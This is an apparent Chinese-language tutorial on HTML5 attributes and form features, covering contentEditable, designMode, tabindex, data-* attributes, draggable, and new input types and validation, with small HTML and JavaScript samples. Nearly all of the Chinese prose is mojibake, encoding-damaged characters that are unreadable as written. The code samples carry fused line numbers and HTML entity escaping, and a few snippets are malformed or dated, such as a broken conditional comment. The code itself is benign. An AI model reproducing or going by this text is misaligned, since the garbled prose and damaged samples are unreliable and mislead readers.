å…¶ä»–å±žæ€§é™¤äº†ä¸Šé¢ä»‹ç»çš„ä¸Žè¡¨å•å’Œé“¾æŽ¥ç›¸å…³çš„å±žæ€§å¤–ï¼ŒHTML5 è¿˜å¢žåŠ äº†ä¸‹é¢çš„å±žæ€§ï¼š olå…ƒç´ å¢žåŠ  reversed,å®ƒæŒ‡å®šäº†åˆ—è¡¨å€’åºæ˜¾ç¤º metaå¢žåŠ  charsetå±žæ€§ã€‚å› ä¸ºè¿™ä¸ªå±žæ€§è¢«å¹¿æ³›æ”¯æŒäº†ï¼Œè€Œä¸”ä¸ºæ–‡æ¡£çš„å­—ç¬¦ç¼–ç çš„æ‰§è¡Œæä¾›äº†ä¸€ç§è‰¯å¥½çš„æ–¹å¼ ä¸º styleå±žæ€§å¢žåŠ scopedå±žæ€§ï¼Œç”¨æ¥è§„å®šæ ·å¼çš„ä½œç”¨èŒƒå›´ï¼Œä¾‹å¦‚åªå¯¹é¡µé¢æŸä¸ªæ ‘èµ·ä½œç”¨ã€‚ scriptå¢žåŠ  asyncå±žæ€§ï¼Œå®šä¹‰è„šæœ¬æ˜¯å¦å¼‚æ­¥æ‰§è¡Œ htmlå¢žåŠ  mainfestï¼Œå¼€å‘ç¦»çº¿Web åº”ç”¨ç¨‹åºæ—¶å®ƒä¸Ž API ç»“åˆä½¿ç”¨ï¼Œå®šä¹‰ä¸€ä¸ª URL,åœ¨è¿™ä¸ª URL ä¸Šæè¿°æ–‡æ¡£çš„ç¼“å­˜ä¿¡æ¯ã€‚ iframeå…ƒç´ å¢žåŠ äº†ä¸‰ä¸ªå±žæ€§ sandboxã€seamlessä¸Ž srcdocï¼Œç”¨æ¥æé«˜é¡µé¢å®‰å…¨æ€§ï¼Œé˜²æ­¢ä¸ä¿¡ä»»çš„ Web é¡µé¢æ‰§è¡ŒæŸäº›æ“ä½œã€‚ åºŸé™¤ åœ¨HTML 4ä¸­ä½¿ç”¨çš„å±žæ€§ ä½¿ç”¨è¯¥å±žæ€§çš„å…ƒç´  åœ¨HTML 5ä¸­çš„æ›¿ä»£æ–¹æ¡ˆ rev linkã€a rel charset linkã€a åœ¨è¢«é“¾æŽ¥çš„èµ„æºçš„ä¸­ä½¿ç”¨HTTP Content-typeå¤´å…ƒç´  shapeã€coords a ä½¿ç”¨areaå…ƒç´ ä»£æ›¿aå…ƒç´  longdesc imgã€iframe ä½¿ç”¨aå…ƒç´ é“¾æŽ¥åˆ°æ ¡é•¿æè¿° target link å¤šä½™å±žæ€§ï¼Œè¢«çœç•¥ nohref area å¤šä½™å±žæ€§ï¼Œè¢«çœç•¥ profile head å¤šä½™å±žæ€§ï¼Œè¢«çœç•¥ version html å¤šä½™å±žæ€§ï¼Œè¢«çœç•¥ name img id scheme meta åªä¸ºæŸä¸ªè¡¨å•åŸŸä½¿ç”¨scheme archive**ã€chlassidã€codeboseã€codetypeã€declareã€standby** object ä½¿ç”¨dataä¸Žtypcå±žæ€§ç±»è°ƒç”¨æ’ä»¶ã€‚éœ€è¦ä½¿ç”¨è¿™äº›å±žæ€§æ¥è®¾ç½®å‚æ•°æ—¶ï¼Œä½¿ç”¨paramå±žæ€§ valuetypeã€type param ä½¿ç”¨nameä¸Žvalueå±žæ€§ï¼Œä¸å£°æ˜Žä¹‹çš„MIMEç±»åž‹ axisã€abbr tdã€th ä½¿ç”¨ä»¥æ˜Žç¡®ç®€æ´çš„æ–‡å­—å¼€å¤´ã€åŽè·Ÿè¯¦è¿°æ–‡å­—çš„å½¢å¼ã€‚å¯ä»¥å¯¹æ›´è¯¦ç»†å†…å®¹ä½¿ç”¨titleå±žæ€§ï¼Œæ¥ä½¿å•å…ƒæ ¼çš„å†…å®¹å˜å¾—ç®€çŸ­ scope td åœ¨è¢«é“¾æŽ¥çš„èµ„æºçš„ä¸­ä½¿ç”¨HTTP Content-typeå¤´å…ƒç´  align captionã€inputã€legendã€divã€h1ã€h2ã€h3ã€h4ã€h5ã€h6ã€p ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alinkã€linkã€textã€vlinkã€backgroundã€bgcolor body ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€bgcolorã€borderã€cellpaddingã€cellspacingã€frameã€rulesã€width table ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€charã€charoffã€heightã€nowrapã€valign tbodyã€theadã€tfoot ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€bgcolorã€charã€charoffã€heightã€nowrapã€valignã€width tdã€th ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€bgcolorã€charã€charoffã€valign tr ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€charã€charoffã€valignã€width colã€colgroup ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€borderã€hspaceã€vspace object ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ clear br ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ compaceã€type olã€ulã€li ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ compace dl ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ compace menu ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ width pre ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€hspaceã€vspace img ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€noshadeã€sizeã€width hr ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ alignã€frameborderã€scrollingã€marginheightã€marginwidth iframe ä½¿ç”¨CSSæ ·å¼è¡¨æ›¿ä»£ autosubmit menu å…¨å±€å±žæ€§contentEditableå…è®¸ç”¨æˆ·ç¼–è¾‘å…ƒç´ ä¸­çš„å†…å®¹ï¼Œè¯¥å…ƒç´ å¿…é¡»æ˜¯å¯ä»¥èŽ·å¾—ç”¨æˆ·é¼ æ ‡ç„¦ç‚¹çš„å…ƒç´ ï¼Œåœ¨ç‚¹å‡»é¼ æ ‡åŽè¦å‘ç”¨æˆ·æä¾›ä¸€ä¸ªæ’å…¥ç¬¦å·ï¼Œæç¤ºç”¨æˆ·è¯¥å…ƒç´ ä¸­çš„å†…å®¹å…è®¸è¢«ç¼–è¾‘ã€‚contentEditableå±žæ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼å±žæ€§ï¼Œå¯ä»¥è¢«æŒ‡å®š trueæˆ–è€… false é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªéšè—çš„ inheritçŠ¶æ€ï¼Œå±žæ€§ä¸º trueï¼Œå…ƒç´ è¢«æŒ‡å®šä¸ºå…è®¸ç¼–è¾‘ï¼Œå±žæ€§ä¸º falseæ—¶ï¼Œå…ƒç´ è¢«æŒ‡å®šä¸ºä¸å…è®¸ç¼–è¾‘ã€‚æœªæŒ‡å®š trueæˆ–è€… falseæ—¶ï¼Œåˆ™ç”± inheritçŠ¶æ€æ¥å†³å®šï¼Œå¦‚æžœå…ƒç´ çš„çˆ¶å…ƒç´ æ˜¯å¯ä»¥ç¼–è¾‘çš„ï¼Œåˆ™è¯¥å…ƒç´ å°±æ˜¯å¯ç¼–è¾‘çš„ã€‚ å…ƒç´ è¿˜å…·æœ‰ä¸€ä¸ªå«åš isContentEditableå±žæ€§ï¼Œå½“å…ƒç´ å¯ç¼–è¾‘æ—¶ï¼Œè¯¥å±žæ€§ä¸º trueï¼Œå½“å…ƒç´ ä¸å¯ç¼–è¾‘æ—¶ï¼Œè¯¥å±žæ€§ ä¸º falseã€‚ 12345&lt;ul contentEditable&gt; &lt;li&gt;å…ƒç´ åˆ—è¡¨1&lt;/li&gt; &lt;li&gt;å…ƒç´ åˆ—è¡¨2&lt;/li&gt; &lt;li&gt;å…ƒç´ åˆ—è¡¨3&lt;/li&gt;&lt;/ul&gt; designModedesignMode å±žæ€§ç”¨æ¥æŒ‡å®šæ•´ä¸ªé¡µé¢æ˜¯å¦å¯ç¼–è¾‘ï¼Œå½“é¡µé¢å¯ç¼–è¾‘æ—¶ï¼Œé¡µé¢ä¸­ä»»ä½•æ”¯æŒä¸Šæ–‡æ‰€è¿°çš„ contentEditable å±žæ€§çš„å…ƒç´ éƒ½å˜æˆäº†å¯ç¼–è¾‘çŠ¶æ€ã€‚designModeåªèƒ½åœ¨ javascript è„šæœ¬é‡Œè¢«ç¼–è¾‘ä¿®æ”¹ã€‚è¯¥å±žæ€§æœ‰ä¸¤ä¸ªå€¼â€”â€”â€œonâ€ å’Œ â€œoffâ€ã€‚å±žæ€§è¢«æŒ‡å®šä¸º onæ—¶ï¼Œé¡µé¢å¯ç¼–è¾‘ï¼Œè¢«æŒ‡å®šä¸º offæ—¶ï¼Œé¡µé¢ä¸å¯ç¼–è¾‘ã€‚ä½¿ç”¨ javascript æ¥æŒ‡å®š designMode å±žæ€§çš„æ–¹æ³•å¦‚ä¸‹ï¼š 1document.designMode = 'on' é’ˆå¯¹ designMode å±žæ€§ï¼Œå„ä¸ªæµè§ˆå™¨çš„æ”¯æŒæƒ…å†µä¹Ÿä¸ä¸€æ ·ï¼š IE8ï¼šå®‰å…¨è€ƒè™‘ï¼Œä¸å…è®¸ä½¿ç”¨ designModeå±žæ€§è®©é¡µé¢è¿›è¡Œç¼–è¾‘çŠ¶æ€ IE9ï¼šå…è®¸ä½¿ç”¨ designModeå±žæ€§è®©é¡µé¢è¿›å…¥ç¼–è¾‘çŠ¶æ€ Chrome3 å’Œ Safariï¼šä½¿ç”¨å†…åµŒ frameæ–¹å¼ï¼Œè¯¥å†…åµŒ frameæ˜¯å¯ç¼–è¾‘çš„ Firefox å’Œ Operaï¼šå…è®¸ä½¿ç”¨ designModeå±žæ€§è®©é¡µé¢è¿›å…¥ç¼–è¾‘çŠ¶æ€ hiddenåœ¨ HTML5 ä¸­ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½å…è®¸æœ‰ä¸€ä¸ª hiddenå±žæ€§ï¼Œè¯¥å±žæ€§ç±»ä¼¼äºŽ input ä¸­çš„ hiddenå…ƒç´ ï¼ŒåŠŸèƒ½æ˜¯é€šçŸ¥æµè§ˆå™¨ä¸æ¸²æŸ“è¯¥å…ƒç´ ï¼Œä½¿è¯¥å…ƒç´ å¤„äºŽä¸å¯è§çŠ¶æ€ã€‚ä½†æ˜¯å…ƒç´ ä¸­çš„å†…å®¹è¿˜æ˜¯æµè§ˆå™¨åˆ›å»ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´é¡µé¢è£…è½½åŽå…è®¸ä½¿ç”¨ javascript è„šæœ¬å°†è¯¥å±žæ€§å–æ¶ˆï¼Œå–æ¶ˆåŽè¯¥å…ƒç´ å˜ä¸ºå¯è§çŠ¶æ€ï¼ŒåŒæ—¶å…ƒç´ ä¸­çš„å†…å®¹é¡µå³æ—¶æ˜¾ç¤ºå‡ºæ¥ã€‚hiddenå±žæ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼çš„å±žæ€§ï¼Œä¸ºè®¾ä¸º trueåŽï¼Œå…ƒç´ å¤„äºŽä¸å¯è§çŠ¶æ€ï¼Œå½“è®¾ä¸º falseåŽï¼Œå…ƒç´ å±žäºŽå¯è§çŠ¶æ€ã€‚ spellcheckspellcheck æ˜¯é’ˆå¯¹ inputä¸Ž textareaè¿™ä¸¤ä¸ªæ–‡æœ¬è¾“å…¥æ¡†æä¾›çš„ä¸€ä¸ªæ–°å±žæ€§ï¼Œå®ƒçš„åŠŸèƒ½ä¸ºå¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬å†…å®¹è¿›è¡Œæ‹¼å†™å’Œè¯­æ³•æ£€æŸ¥ã€‚æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼å±žæ€§ï¼Œå…·æœ‰ true å’Œ false ä¸¤ç§å€¼ã€‚å¿…é¡»æ˜Žç¡®ä¹¦å†™å±žæ€§å€¼ 123&lt;textarea contentEditable spellcheck="true"&gt;&lt;/textarea&gt;&lt;input type="text" spellcheck="true"&gt;&lt;p contenteditable="true" spellcheck="true"&gt;è¿™æ˜¯å¯ç¼–è¾‘çš„æ®µè½ã€‚è¯·è¯•ç€ç¼–è¾‘æ–‡æœ¬ã€‚&lt;/p&gt; éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æžœå…ƒç´ çš„ readonlyæˆ–è€… disabledè®¾ä¸º trueï¼Œåˆ™ä¸æ‰§è¡Œæ‹¼å†™æ£€æŸ¥ã€‚ tabindexå½“ä¸æ–­æ•²å‡» Tab é”®è®©çª—å£æˆ–è€…é¡µé¢ä¸­çš„æŽ§ä»¶èŽ·å¾—ç„¦ç‚¹ï¼Œå¯¹çª—å£æˆ–è€…é¡µé¢çš„æ‰€æœ‰æŽ§ä»¶è¿›è¡ŒéåŽ†çš„æ—¶å€™ï¼Œæ¯ä¸€ä¸ªæŽ§ä»¶çš„ tabindexè¡¨ç¤ºè¯¥æŽ§ä»¶æ˜¯ç¬¬å‡ ä¸ªé¡µé¢è®¿é—®åˆ°çš„ã€‚ è¿‡åŽ»çš„è¿™ä¸ªå±žæ€§åœ¨ç¼–è¾‘ç½‘é¡µçš„æ—¶å€™éžå¸¸æœ‰ç”¨ï¼Œä½†å¦‚ä»ŠæŽ§ä»¶çš„éåŽ†é¡ºåºæ˜¯ç”±å…ƒç´ åœ¨é¡µé¢ä¸Šæ‰€å¤„çš„ä½ç½®å†³å®šçš„ï¼Œæ‰€ä»¥ä¸å†éœ€è¦äº†ã€‚ ä½†æ˜¯ tabindexè¿˜æœ‰å¦å¤–ä¸€ä¸ªä½œç”¨ï¼Œåœ¨é»˜è®¤å±žæ€§ä¸‹ï¼Œåªæœ‰é“¾æŽ¥å…ƒç´ ä¸Žè¡¨å•å¯ä»¥é€šè¿‡æŒ‰é”®èŽ·å¾—ç„¦ç‚¹ã€‚å¦‚æžœå¯¹å…¶ä»–å…ƒç´ ä½¿ç”¨ tabindexå±žæ€§åŽï¼Œä¹Ÿèƒ½è®©è¯¥å…ƒç´ èŽ·å¾—ç„¦ç‚¹ï¼Œé‚£ä¹ˆå½“è„šæœ¬ä¸­æ‰§è¡Œ focus()è¯­å¥çš„æ—¶å€™ï¼Œå°±å¯ä»¥è®©è¯¥å…ƒç´ èŽ·å¾—ç„¦ç‚¹äº†ã€‚ä½†è¿™æ ·åšä¼šæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼šé’™å…ƒç´ ä¹Ÿå¯ä»¥é€šè¿‡æŒ‰ Tab é”®èŽ·å¾—ç„¦ç‚¹ï¼Œè€Œè¿™æ—¶æœ‰å¯èƒ½ä¹Ÿä¸æ˜¯å¼€å‘è€…æƒ³è¦çš„ç»“æžœã€‚ æŠŠå…ƒç´ çš„ tabindexè®¾ä¸ºä¸ºè´Ÿæ•°ï¼ˆé€šå¸¸ä¸º-1ï¼‰åŽå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚tabindexçš„å€¼ä¸ºè´Ÿæ•°åŽï¼Œä»ç„¶å¯ä»¥é€šè¿‡ç¼–ç¨‹çš„æ–¹å¼è®©å…ƒç´ èŽ·å¾—ç„¦ç‚¹ï¼Œä½†æŒ‰ä¸‹ Tab é”®æ—¶è¯¥å…ƒç´ å°±ä¸èƒ½èŽ·å¾—ç„¦ç‚¹äº†ã€‚è¿™åœ¨å¤æ‚çš„é¡µé¢ä¸­æˆ–å¤æ‚çš„ Web åº”ç”¨ç¨‹åºä¸­æ˜¯éžå¸¸æœ‰ç”¨çš„ã€‚åœ¨ HTML4 ä¸­ï¼Œ-1 æ˜¯ä¸€ä¸ªæ— ç”¨çš„å±žæ€§å€¼ï¼Œä½†åˆ°äº† HTML5 ä¸­ï¼Œé€šè¿‡å·§å¦™è¿ç”¨è®©è¯¥å±žæ€§å¾—åˆ°äº†æžå¤§çš„åº”ç”¨ã€‚ 123&lt;a href="http://laibh.top" tabindex="2"&gt;èµ–åŒå­¦&lt;/a&gt;&lt;br /&gt;&lt;a href="http://www.google.com/" tabindex="1"&gt;Google&lt;/a&gt;&lt;br /&gt;&lt;a href="http://www.microsoft.com/" tabindex="3"&gt;Microsoft&lt;/a&gt; data-*ä½¿ç”¨ data-* å±žæ€§æ¥åµŒå…¥è‡ªå®šä¹‰æ•°æ® 1234567891011121314151617&lt;ul id="target"&gt; &lt;li id="e1" data-animal-type="é¸Ÿç±»"&gt;å–œé¹Š&lt;/li&gt; &lt;li id="e2" data-animal-type="é±¼ç±»"&gt;é‡‘æžªé±¼&lt;/li&gt; &lt;li id="e3" data-animal-type="èœ˜è››"&gt;è‡è™Ž&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; function showDetails(animal) &#123; let animalType = animal.getAttribute("data-animal-type"); console.log(animal.innerHTML + 'æ˜¯ä¸€ç§' + animalType); &#125; const ul = document.getElementById('target'); ul.onclick = function (e) &#123; let ev = e || window.event; let target = ev.target || ev.srcElement; showDetails(target); &#125;&lt;/script&gt; draggableè§„å®šå…ƒç´ æ˜¯å¦å¯ä»¥æ‹–åŠ¨ï¼Œé“¾æŽ¥å’Œå›¾åƒé»˜è®¤æ˜¯å¯ä»¥æ‹–åŠ¨çš„ã€‚ è¯­æ³•ï¼š 1&lt;element draggable="true|false|auto"&gt; ä¾‹å­ï¼š 1234567891011121314151617181920212223&lt;style&gt; #dropbox&#123; width: 400px; height: 400px; border:1px solid #aaaaaa; &#125;&lt;/style&gt;&lt;div id="dropbox" ondrop="drop(event)" ondragover="allowDrop(event)"&gt;&lt;/div&gt;&lt;br&gt;&lt;p id="drag" draggable="true" ondragstart="drag(event)"&gt;è¿™æ˜¯ä¸€æ®µå¯ç§»åŠ¨çš„æ®µè½ï¼Œè¯·æŠŠè¯¥æ®µè½æ‹–å…¥ä¸Šé¢çš„çŸ©å½¢&lt;/p&gt;&lt;script&gt; function allowDrop(ev)&#123; ev.preventDefault(); &#125; function drag(ev)&#123; ev.dataTransfer.setData('Text',ev.target.id) &#125; function drop(ev)&#123; let data = ev.dataTransfer.getData('Text'); ev.target.appendChild(document.getElementById(data)); ev.preventDefault() &#125;&lt;/script&gt; æ–°ç»“æž„å…ƒç´ ä½¿ç”¨æ ·å¼å…¼å®¹æ—§ç‰ˆæœ¬æµè§ˆå™¨çš„ hack 1234567891011121314151617181920212223242526272829&lt;style&gt; article,aside,dialog,figure,footer,header,legend,nav,section&#123; display:block; &#125; nav&#123; float:left; width:20%; &#125; article&#123; float:right; width:79%; &#125;&lt;/style&gt;&lt;!--IE8ä¹‹å‰çš„æµè§ˆå™¨ä¸æ”¯æŒä½¿ç”¨ CSSæ–¹æ³•æ¥ä½¿ç”¨è¿™äº›å°šæœªæ”¯æŒçš„ç»“æž„å…ƒç´ ï¼Œéœ€è¦ä½¿ç”¨è„šæœ¬å®šä¹‰--&gt;&lt;script&gt; document.createElement('header'); document.createElement('nav'); document.createElement('article'); document.createElement('footer');&lt;/script&gt;&lt;!--æˆ–è€…å¼•å…¥ä¸€ä¸ª jsæ¥hack--&gt;&lt;head&gt; &lt;title&gt;HTML5 HACK&lt;/title&gt; &lt;!--[if lt IE9]&gt; &lt;script src="http://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js"&gt;&lt;/script&gt; &lt;![end if]--&gt;&lt;/head&gt; è¡¨å•ä¸Žæ–‡ä»¶æ–°çš„ form å±žæ€§ï¼š autocomplete novalidate æ–°çš„ input å±žæ€§ï¼š autocomplete autofocus form form overrides (formaction, formenctype, formmethod, formnovalidate, formtarget) height å’Œ width list min, max å’Œ step multiple pattern (regexp) placeholder required æµè§ˆå™¨æ”¯æŒ Input type IE Firefox Opera Chrome Safari autocomplete 8.0 3.5 9.5 3.0 4.0 autofocus No No 10.0 3.0 4.0 form No No 9.5 No No form overrides No No 10.5 No No height and width 8.0 3.5 9.5 3.0 4.0 list No No 9.5 No No min, max and step No No 9.5 3.0 No multiple No 3.5 No 3.0 4.0 novalidate No No No No No pattern No No 9.5 3.0 No placeholder No No No 3.0 3.0 required No No 9.5 3.0 No æ–°å¢žå±žæ€§form åœ¨ HTML4 ä¸­è¡¨å•å†…çš„ä»Žå±žå…ƒç´ å¿…é¡»å†™åœ¨è¡¨å•å†…å®¹ï¼Œä½†æ˜¯ HTML5 ä¸­ï¼Œå¯ä»¥æŠŠå®ƒä¹¦å†™åœ¨é¡µé¢çš„ä»»ä½•åœ°æ–¹ï¼Œç„¶åŽç»™è¯¥å…ƒç´ æŒ‡å®šä¸€ä¸ª formå±žæ€§ã€‚å±žæ€§å€¼ä¸ºè¯¥è¡¨å•çš„ idï¼Œè¿™æ ·å°±å¯ä»¥å£°æ˜Žè¯¥å…ƒç´ ä»Žå±žäºŽæŒ‡å®šè¡¨å•äº†ã€‚ 1234&lt;form id="testform"&gt; &lt;input type="text"&gt;&lt;/form&gt;&lt;textarea form="testform"&gt;&lt;/textarea&gt; ç›®å‰åªæœ‰ Opera æ”¯æŒè¿™ä¸ªå±žæ€§ formaction HTML4ä¸­ï¼Œä¸€ä¸ªè¡¨å•å†…çš„æ‰€æœ‰å…ƒç´ éƒ½åªèƒ½é€šè¿‡è¡¨å•çš„ actionå±žæ€§ç»Ÿä¸€æäº¤åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œè€Œåœ¨ HTML5 å¯ä»¥ç»™æ‰€æœ‰çš„æäº¤æŒ‰é’®ï¼Œ&lt;input type=&quot;submit&quot;&gt;ã€&lt;input type=&quot;image&quot;&gt;ã€&lt;button type=&quot;submit&quot;&gt;éƒ½å¢žåŠ  formactionå±žæ€§ï¼Œä½¿å¾—ç‚¹å‡»ä¸åŒçš„æŒ‰é’®ï¼Œå¯ä»¥å°†è¡¨å•æäº¤åˆ°ä¸åŒçš„é¡µé¢ 12345&lt;form id="testform"&gt; &lt;input type="submit" name="s1" value="v1" formaction="s1.jsp"&gt;æäº¤åˆ° s1 &lt;input type="submit" name="s2" value="v2" formaction="s2.jsp"&gt;æäº¤åˆ° s2 &lt;input type="submit" name="s3" value="v3" formaction="s3.jsp"&gt;æäº¤åˆ° s3&lt;/form&gt; ç›®å‰æ²¡æœ‰æµè§ˆå™¨æ”¯æŒè¿™ä¸€å±žæ€§ formmethod åœ¨ HTML4 ä¸­åªæœ‰ä¸€ä¸ªè¡¨å•å†…æœ‰ actionå±žæ€§æ¥å¯¹è¡¨å•å†…æ‰€æœ‰å…ƒç´ ç»Ÿä¸€æŒ‡å®šæäº¤é¡µé¢ï¼Œæ‰€ä»¥æ¯ä¸ªè¡¨å•å†…åªæœ‰ä¸€ä¸ª methodå±žæ€§æ¥æŒ‡ç»Ÿä¸€æŒ‡å®šæäº¤æ–¹æ³•ã€‚åœ¨ HTML5 ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ formactionå±žæ€§æ¥å¯¹æ¯ä¸ªè¡¨å•å…ƒç´ åˆ†åˆ«æŒ‡å®šä¸åŒçš„æäº¤é¡µé¢ï¼Œä¹Ÿå¯ä»¥ç”¨ formmethodå¯¹æ¯ä¸ªè¡¨å•å…ƒç´ åˆ†åˆ«æŒ‡å®šä¸åŒçš„æäº¤æ–¹å¼ã€‚ 1234&lt;form id="testform" action="serve.jsp"&gt; &lt;input type="submit" name="s1" value="v1" formaction="s1.jsp" formmethod="get"&gt;æäº¤åˆ° s1 &lt;input type="submit" name="s2" value="v2" formaction="s2.jsp" formmethod="post"&gt;æäº¤åˆ° s2&lt;/form&gt; ç›®å‰æ²¡æœ‰æµè§ˆå™¨æ”¯æŒè¿™ä¸€å±žæ€§ placeholder æ˜¯æŒ‡æ–‡æœ¬æ¡†ä¸ºè¾“å…¥çŠ¶æ€æ—¶ï¼Œæ–‡æœ¬æ¡†é‡Œé¢æ˜¾ç¤ºçš„è¾“å…¥æç¤ºã€‚ 1&lt;input type="text" placeholder="input me"&gt; autofocus ç»™æ–‡æœ¬æ¡†ã€é€‰æ‹©æ¡†æˆ–è€…æŒ‰é’®æŽ§ä»¶åŠ ä¸Šè¯¥å±žæ€§ï¼Œå½“ç”»é¢æ‰“å¼€çš„æ—¶å€™ï¼Œè¯¥æŽ§ä»¶è‡ªåŠ¨èŽ·å¾—å…‰æ ‡ç„¦ç‚¹ã€‚ 1&lt;input type="text" autofocus&gt; ä¸€ä¸ªé¡µé¢åªèƒ½æœ‰ä¸€ä¸ªæŽ§ä»¶å…·æœ‰è¯¥å±žæ€§ã€‚ä¸è¦æ»¥ç”¨ï¼Œå»ºè®®åªæœ‰å½“ä¸€ä¸ªé¡µé¢æ˜¯ä»¥ä½¿ç”¨æŸä¸ªæŽ§ä»¶ä¸ºä¸»è¦ç›®çš„çš„æ—¶å€™æ‰ä½¿ç”¨ã€‚ä¾‹å¦‚æœç´¢é¡µé¢ä¸­çš„æœç´¢æ–‡æœ¬æ¡†ã€‚ list ä¸ºå•è¡Œæ–‡æœ¬æ¡†æ·»åŠ ä¸€ä¸ª listå±žæ€§ï¼Œå®ƒçš„å€¼ä¸ºæŸä¸ª datalistå…ƒç´ çš„ idã€‚ç±»ä¼¼äºŽ selectï¼Œä¸åŒçš„æ˜¯å®ƒé™¤äº†å¯ä»¥é€‰æ‹©ä¹‹å¤–ï¼Œè¿˜å¯ä»¥è‡ªå·±è¾“å…¥ã€‚ 123456&lt;input list="cars" /&gt;&lt;datalist id="cars"&gt; &lt;option value="BMW"&gt; &lt;option value="Ford"&gt; &lt;option value="Volvo"&gt;&lt;/datalist&gt; autocomplete è¾…åŠ©è¾“å…¥æ‰€ç”¨çš„è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ï¼Œæ˜¯ä¸€ä¸ªèŠ‚çœè¾“å…¥æ—¶é—´ï¼ŒåŒæ—¶ä¹Ÿéžå¸¸æ–¹ä¾¿çš„åŠŸèƒ½ã€‚å¯ä»¥æŒ‡å®š onã€offã€&quot;&quot;ä¸‰ä¸ªå€¼ã€‚ä¸æŒ‡å®šæ—¶ç”¨æµè§ˆå™¨çš„é»˜è®¤å€¼ã€‚ 1&lt;input type="text" name="greeting" autocomplete="on" list="greetings"&gt; è¡¨å•å…ƒç´ ç§ç±»urlã€emailã€dateã€timeã€datetimeã€datetime-localã€monthã€weekã€numberã€rangeã€searchã€telã€color 12345678910111213&lt;input type="url" value="http://laibh.top"&gt;&lt;input type="email" value="544289495@qq.com"&gt;&lt;input type="date" value="2019-05-22"&gt;&lt;input type="time" value="11:27"&gt;&lt;input type="datetime"&gt;&lt;input type="datetime-local"&gt;&lt;input type="month" value="2019-05"&gt;&lt;input type="week" value="2019-W21"&gt;&lt;input type="number" value="25" min="10" max="100" step="2"&gt;&lt;input type="range" value="25" min="10" max="100" step="2"&gt;&lt;input type="search"&gt;&lt;input type="tel"&gt;&lt;input type="color"&gt; output å®šä¹‰äº†ä¸åŒç±»åž‹çš„è¾“å‡ºï¼Œæ¯”å¦‚è®¡ç®—ç»“æžœæˆ–è€…è„šæœ¬çš„è¾“å‡ºã€‚output å…ƒç´ å¿…é¡»ä»Žå±žæŸä¸ªè¡¨å•ï¼Œå¿…é¡»å°†å®ƒä¹¦å†™åœ¨è¡¨å•å†…éƒ¨ï¼Œæˆ–è€…å¯¹å®ƒæ·»åŠ  form å±žæ€§ã€‚ 123456789&lt;form id="testform1"&gt; &lt;input type="range" min="0" max="100" name="range1" step="5"&gt; &lt;output onforminput="value=range1.value"&gt;50&lt;/output&gt;&lt;/form&gt;&lt;!--æˆ–è€…æµè§ˆå™¨å…¼å®¹æ›´å¥½çš„ä¸‹é¢è¿™ç§æ–¹å¼--&gt;&lt;form id="testform1" oninput="x.value=range1.value"&gt; &lt;input type="range" min="0" max="100" name="range1" step="5"&gt; &lt;output name="x" for="range1"&gt;50&lt;/output&gt;&lt;/form&gt; å±žæ€§ å€¼ æè¿° for element_id å®šä¹‰è¾“å‡ºåŸŸç›¸å…³çš„ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ã€‚ form form_id å®šä¹‰è¾“å…¥å­—æ®µæ‰€å±žçš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨å•ã€‚ name name å®šä¹‰å¯¹è±¡çš„å”¯ä¸€åç§°ã€‚ï¼ˆè¡¨å•æäº¤æ—¶ä½¿ç”¨ï¼‰ è¡¨å•éªŒè¯è‡ªåŠ¨éªŒè¯ require å¯ä»¥åº”ç”¨åœ¨å¤§éƒ¨åˆ†è¾“å…¥å…ƒç´ ï¼ˆé™¤äº†éšè—å…ƒç´ ï¼Œå›¾ç‰‡æŒ‰é’®ä¸Šï¼‰ã€‚åœ¨æäº¤æ—¶ï¼Œå¦‚æžœå…ƒç´ ä¸­å†…å®¹ä¸ºç©ºç™½ï¼Œåˆ™ä¸å…è®¸æäº¤ï¼ŒåŒæ—¶åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºä¿¡æ¯æç¤ºæ–‡å­—ã€‚ pattern è¦æ±‚è¾“å…¥å†…å®¹æ ¼å¼çš„ï¼Œå¯¹ inputä½¿ç”¨ patternå±žæ€§ï¼Œè®¾ä¸ºæŸä¸ªæ­£åˆ™è¡¨è¾¾å¼ 1&lt;input pattern="[0-9][A-Z]&#123;3&#125;" name="part" placeholder="è¾“å…¥å†…å®¹ï¼›ä¸€ä¸ªæ•°å­—ä¸Žä¸‰ä¸ªå¤§å†™å­—æ¯"&gt; min ä¸Ž max æ•°å€¼ç±»åž‹ä¸Žæ—¥æœŸç±»åž‹å…ƒç´ ä¸“ç”¨å±žæ€§ã€‚é™åˆ¶äº† inputå…ƒç´ è¾“å…¥çš„æ•°å€¼ä¸Žæ—¥æœŸèŒƒå›´ã€‚ step æŽ§åˆ¶ inputå…ƒç´ 